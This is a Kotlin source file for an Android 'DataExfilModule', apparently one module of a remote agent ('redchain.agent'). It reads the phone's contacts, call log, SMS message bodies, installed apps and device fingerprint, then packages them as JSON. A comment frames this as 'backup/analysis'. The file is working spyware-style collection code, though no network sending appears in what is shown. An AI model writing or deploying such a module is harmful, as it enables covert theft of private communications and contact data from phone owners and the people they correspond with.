package com.redchain.agent.modules

import android.content.Context
import android.os.Build
import android.provider.ContactsContract
import android.provider.CallLog
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

/**
 * Data Exfiltration Module
 * Extract data from owner's phone for backup/analysis
 */
object DataExfilModule {

    /**
     * Get contacts list
     */
    fun getContacts(context: Context): JSONObject {
        val result = JSONObject()
        val contacts = JSONArray()

        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME) ?: 0)
                    val number = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER) ?: 1)

                    contacts.put(JSONObject().apply {
                        put("name", name)
                        put("number", number)
                    })
                }
            }

            result.put("total_contacts", contacts.length())
            result.put("contacts", contacts)
            result.put("status", "success")

        } catch (e: Exception) {
            result.put("status", "error")
            result.put("error", e.message)
        }

        return result
    }

    /**
     * Get call history
     */
    fun getCallHistory(context: Context, limit: Int = 100): JSONObject {
        val result = JSONObject()
        val calls = JSONArray()

        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT $limit"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER) ?: 0)
                    val type = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE) ?: 1)
                    val date = it.getLong(it.getColumnIndex(CallLog.Calls.DATE) ?: 2)
                    val duration = it.getInt(it.getColumnIndex(CallLog.Calls.DURATION) ?: 3)

                    val typeStr = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        else -> "unknown"
                    }

                    calls.put(JSONObject().apply {
                        put("number", number)
                        put("type", typeStr)
                        put("date", date)
                        put("duration_seconds", duration)
                    })
                }
            }

            result.put("total_calls", calls.length())
            result.put("calls", calls)
            result.put("status", "success")

        } catch (e: Exception) {
            result.put("status", "error")
            result.put("error", e.message)
        }

        return result
    }

    /**
     * Get SMS messages
     */
    fun getSMSMessages(context: Context, limit: Int = 100): JSONObject {
        val result = JSONObject()
        val messages = JSONArray()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                val cursor = context.contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    null, null, null,
                    Telephony.Sms.DATE + " DESC LIMIT $limit"
                )

                cursor?.use {
                    while (it.moveToNext()) {
                        val address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS) ?: 0)
                        val body = it.getString(it.getColumnIndex(Telephony.Sms.BODY) ?: 1)
                        val date = it.getLong(it.getColumnIndex(Telephony.Sms.DATE) ?: 2)
                        val type = it.getInt(it.getColumnIndex(Telephony.Sms.TYPE) ?: 3)

                        val typeStr = when (type) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "received"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                            else -> "unknown"
                        }

                        messages.put(JSONObject().apply {
                            put("address", address)
                            put("body", body)
                            put("date", date)
                            put("type", typeStr)
                        })
                    }
                }
            }

            result.put("total_messages", messages.length())
            result.put("messages", messages)
            result.put("status", "success")

        } catch (e: Exception) {
            result.put("status", "error")
            result.put("error", e.message)
        }

        return result
    }

    /**
     * Get installed apps list
     */
    fun getInstalledApps(context: Context): JSONObject {
        val result = JSONObject()
        val apps = JSONArray()

        try {
            val packageManager = context.packageManager
            val packages = packageManager.getInstalledApplications(0)

            for (pkg in packages) {
                apps.put(JSONObject().apply {
                    put("package_name", pkg.packageName)
                    put("app_name", packageManager.getApplicationLabel(pkg).toString())
                    put("is_system_app", (pkg.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
                })
            }

            result.put("total_apps", apps.length())
            result.put("apps", apps)
            result.put("status", "success")

        } catch (e: Exception) {
            result.put("status", "error")
            result.put("error", e.message)
        }

        return result
    }

    /**
     * Get device information
     */
    fun getDeviceInfo(): JSONObject {
        return JSONObject().apply {
            put("manufacturer", Build.MANUFACTURER)
            put("model", Build.MODEL)
            put("brand", Build.BRAND)
            put("device", Build.DEVICE)
            put("product", Build.PRODUCT)
            put("android_version", Build.VERSION.RELEASE)
            put("sdk_int", Build.VERSION.SDK_INT)
            put("build_id", Build.ID)
            put("fingerprint", Build.FINGERPRINT)
        }
    }
}
